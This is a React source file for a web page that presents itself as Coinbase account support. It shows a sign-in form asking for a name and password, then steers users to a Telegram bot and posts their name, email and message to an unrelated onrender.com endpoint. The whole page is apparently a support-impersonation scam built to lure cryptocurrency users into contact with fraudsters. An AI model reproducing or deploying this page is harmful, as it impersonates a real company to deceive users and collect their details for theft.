import React, { useState } from "react";
import ReactDOM from "react-dom/client";

function App() {
  const [showLogin, setShowLogin] = useState(false);
  const [loggedIn, setLoggedIn] = useState(false);
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [message, setMessage] = useState("");
  const [sent, setSent] = useState(false);

  const handleLogin = () => {
    if (name.trim() && password.trim()) {
      setLoggedIn(true);
    }
  };

  const sendEmail = async () => {
    if (!email || !message) return;
    await fetch("https://coinbase-chat-api.onrender.com/send-support-message", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, email, message })
    });
    setSent(true);
    setEmail("");
    setMessage("");
    setTimeout(() => setSent(false), 3000);
  };

  return (
    <div style={wrapper}>
      {!showLogin ? (
        <div style={heroBox}>
          <h1 style={{ fontSize: "32px", marginBottom: 10 }}>Need help?</h1>
          <p style={{ marginBottom: 30, fontSize: "16px", color: "#cbd5e1" }}>
            We're here to help you with anything related to your Coinbase account.
          </p>
          <button style={buttonStyle} onClick={() => setShowLogin(true)}>
            Sign in to speak with us
          </button>
        </div>
      ) : !loggedIn ? (
        <div style={box}>
          <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
          <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
          <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
          <button style={buttonStyle} onClick={handleLogin}>Log in</button>
        </div>
      ) : (
        <div style={box}>
          <h2>Welcome, {name}</h2>
          <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
            💬 Contact us via Telegram
          </a>
          <p style={{ marginTop: 30 }}>Or send us a message via email:</p>
          <input style={inputStyle} placeholder="Your email" value={email} onChange={(e) => setEmail(e.target.value)} />
          <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} />
          <button style={buttonStyle} onClick={sendEmail}>📨 Send Message</button>
          {sent && <p style={{ color: "lightgreen", marginTop: 10 }}>✅ Message sent!</p>}
        </div>
      )}
    </div>
  );
}

const wrapper = {
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  minHeight: '100vh',
  backgroundColor: '#0a0f1c',
  textAlign: 'center',
  padding: 20
};

const heroBox = {
  maxWidth: 500
};

const box = {
  width: '100%',
  maxWidth: 500,
  background: '#1e293b',
  padding: 30,
  borderRadius: 12,
  boxShadow: '0 0 20px rgba(0,0,0,0.3)',
  textAlign: 'center'
};

const inputStyle = {
  width: "100%",
  padding: "12px",
  borderRadius: "8px",
  border: "1px solid #334155",
  backgroundColor: "#0f172a",
  color: "#f8fafc",
  fontSize: "16px",
  marginBottom: "10px"
};

const buttonStyle = {
  width: "100%",
  padding: "12px",
  borderRadius: "8px",
  backgroundColor: "#3b82f6",
  color: "#fff",
  border: "none",
  cursor: "pointer",
  fontSize: "16px",
  marginTop: "10px"
};

const linkButton = {
  display: "block",
  margin: "20px auto",
  padding: "12px",
  borderRadius: "8px",
  backgroundColor: "#2563eb",
  color: "#fff",
  fontWeight: "600",
  textDecoration: "none",
  width: "100%"
};

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
